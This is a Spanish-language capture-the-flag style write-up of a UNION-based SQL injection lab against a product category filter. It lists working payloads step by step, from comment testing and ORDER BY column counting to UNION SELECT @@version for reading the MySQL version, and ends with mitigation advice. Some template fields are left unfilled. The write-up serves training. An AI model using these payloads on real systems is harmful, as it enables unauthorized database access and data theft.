---
title: "ATAQUE DE INYECCION BLING"
platform: "HackTheBox"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "ataque-de-inyeccion-bling"
author: "Z4k7"
date: "2026-03-07"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "WebSecurity"
  - "BurpSuite"
  - "PortSwiggerLab"
  - "MySQL"
  - "Consulta"
techniques:
  - "Completar manualmente"
tools:
  - "Completar herramientas"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "La vulnerabilidad de SQL Injection (SQLi) ocurre cuando una aplicación web concatena directamente la entrada del usuario en una consulta SQL sin validación ni sanitización.   En este laboratorio, el filtro de categorías de productos es vulnerable, permitiendo inyecciones mediante UNION SELECT. El objetivo es extraer la cadena de versión de la base de datos (@@version en MySQL)."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Se puede usar un ataque UNION para recuperar los resultados de una consulta inyectada.
          Para resolver el laboratorio, muestre la cadena de versión de la base de datos

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con comentarios:
      - kind: "code"
        lang: "SQL"
        code: |
          '-- -- Error esperado 
          '# -- Comentario válido en MySQL
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: ""
      - kind: "note"
        text: |
          El uso de '# confirma que el motor es MySQL, ya que acepta este tipo de comentario.
      - kind: "image"
        src: "Pasted image 20260302201922.png"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: ""
      - kind: "note"
        text: |
          La captura muestra el uso de BurpSuite para interceptar y modificar las peticiones, evitando recargar manualmente la web.

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          1. Determinar número de columnas con ORDER BY:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2# -- Éxito 
          '+ORDER+BY+1,2,3# -- Error
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: ""
      - kind: "note"
        text: |
          El error en la tercera prueba confirma que la consulta devuelve 2 columnas.
          2. Validar con UNION SELECT:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL# -- Error 
          UNION SELECT NULL,NULL# -- Éxito 
          UNION SELECT NULL,NULL,NULL# -- Error
      - kind: "image"
        src: "Pasted image 20260302202232.png"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: ""
      - kind: "note"
        text: |
          La consulta exitosa con 2 columnas confirma la estructura de la tabla subyacente.
          3. Extraer versión de la base de datos: [[SQL injection#Consulta del tipo y la versión de la base de datos]]
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT @@version,NULL#
      - kind: "image"
        src: "Pasted image 20260302202606.png"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: ""
      - kind: "note"
        text: |
          La inyección muestra la cadena de versión de MySQL en la respuesta del servidor.

  - id: "step4"
    num: "04"
    title: "Evidencia"
    content:
      - kind: "bullet"
        text: "Cadena de versión obtenida: @@version → Ejemplo: 8.0.28"

  - id: "flag_01"
    type: "flag"
    flag_items:

lessons:
  - "Siempre identificar el número de columnas primero."
  - "Usar `NULL` como placeholder en UNION SELECT."
  - "Conocer atributos específicos del motor (`@@version` en MySQL, `banner` en Oracle)."
mitigation: "Mitigación Técnica Implementar consultas parametrizadas (Prepared Statements). Escapar y validar entradas de usuario. Configurar WAF para detectar patrones de inyección (`UNION`, `ORDER BY`). Minimizar mensajes de error expuestos al cliente."
---
